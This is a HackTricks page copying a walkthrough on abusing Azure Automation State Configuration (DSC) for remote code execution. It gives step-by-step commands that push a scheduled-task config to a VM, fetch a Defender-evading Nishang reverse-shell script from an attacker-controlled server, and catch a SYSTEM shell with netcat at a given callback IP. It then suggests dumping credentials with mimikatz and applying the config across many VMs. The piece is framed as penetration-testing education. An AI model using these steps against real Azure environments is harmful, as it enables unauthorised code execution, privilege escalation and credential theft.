# Az - State Configuration RCE

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**This post was copied from** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)\*\*\*\*

### Remote Server (C2) Infrastructure Preparation <a href="#f0fa" id="f0fa"></a>

I will be hosting a stripped-down version of the Nishang Invoke-PowerShellTcp.ps1 payload from the remote server ‚Äú40.84.7.74‚Äù, which is the Kali box. The payload name will be ‚ÄúRevPS.ps1‚Äù. To prevent the Nishang script getting deleted by Windows Defender for any reason (maybe you‚Äôd rather drop the file to disk) I have a lightweight version here that you can use which will bypass Defender: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). This will be hosted by a simple Python Simple Server on the Kali box.

### Step 1 ‚Äî Create Files <a href="#89de" id="89de"></a>

We‚Äôll need to create another DSC configuration file. A template can be downloaded here: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). This config file will use the same file-write function that we previously used. This time, the contents include code to download and execute a payload from our remote server. Also, we‚Äôre using a scheduled-task function available from the _ComputerManagementDsc_ module. The scheduled-task function will be the key role in execution and providing us with SYSTEM privileges later on.

We‚Äôll also download a script which will be used to publish our configuration to the VM. This is located here: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

These files will serve as a template. **You‚Äôll need to fill in the variable names and parameters with what you‚Äôre using**. This includes the resource names, file paths, and the external server/payload names that you‚Äôre using. Please refer to the comments in the code.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Step 2 ‚Äî Zip Configuration File <a href="#c2c2" id="c2c2"></a>

With our two files created, we‚Äôll zip the **‚Äòreverse\_shell\_config.ps1‚Äô** file so it can be sent to the Storage Account

```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Step 3 ‚Äî Set Storage Context & Upload <a href="#bed9" id="bed9"></a>

Again, we‚Äôll setup the context of our Storage Account which I‚Äôve already done. I already have a container named ‚Äò**azure-pentes**t‚Äô so this is where I‚Äôll be publishing mine:

```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```

<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### Step 4 ‚Äî Prep Kali Box <a href="#20fb" id="20fb"></a>

In our Kali box, we can simply _wget_ our PowerShell payload. The raw reverse-shell script is located here: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).

```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

We need to edit the reverse-shell script by adding our parameters in, so the Windows VM knows where to connect to once it‚Äôs executed. In my case I add following:

```
RevPShell -Reverse 40.84.7.73 443
```

<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### Step 5 ‚Äî Publish Configuration File <a href="#9ad6" id="9ad6"></a>

Now we‚Äôll run our configuration file. I have mine setup to be published to the Desktop for a better visual, however it can be published just about anywhere. After a couple of minutes, we‚Äôll see that the reverse-shell script has been published!

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Step 6 ‚Äî Host Payload and Setup Listener <a href="#c55f" id="c55f"></a>

Once we publish the configuration, we can concurrently start a Python SimpleHTTPServer over port 80 to host the payload, along with a netcat listener in order to catch the connection:

```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```

We see that the scheduled task has run and our payload was retrieved and executed in memory with **SYSTEM** level privileges!

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Wrapping Up <a href="#1ec2" id="1ec2"></a>

This now opens the door for many possibilities. Since we have a shell running as **SYSTEM,** we can dump credentials with mimikatz (potentially risky depending on how mature the EDR is for cloud resources). If you dump creds , there's a good chance that these can be reused elsewhere across different resources. Lastly, a big takeaway is that instead of limiting this to one VM, you now have the ability to potentially apply this configuration across multiple VM‚Äôs.

On that note, this concludes our Azure Automation DSC adventures! I hope you had fun, learned a lot and continue to expand with your own creativity.

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
